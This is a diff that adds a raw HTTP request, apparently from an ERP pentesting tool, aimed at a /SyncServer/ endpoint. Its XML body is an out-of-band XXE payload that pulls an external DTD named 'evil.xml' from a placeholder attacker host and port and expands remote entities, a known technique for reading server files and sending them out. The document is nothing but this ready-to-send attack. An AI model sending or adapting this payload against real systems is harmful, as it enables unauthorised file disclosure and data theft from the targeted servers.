@@ -1,0 +1,15 @@
+POST /SyncServer/ HTTP/1.1
+Host: 172.16.0.79
+Content-Type: text/xml; charset=utf-8
+Content-Length: 166
+Connection: close
+User-Agent: ERPScan Pentesting tool
+SOAPAction: zzzz
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+<!ENTITY % remote SYSTEM "http://%IP%:%PORT%/evil.xml">
+%remote;
+%param1;
+]>
+<root>&external;</root>
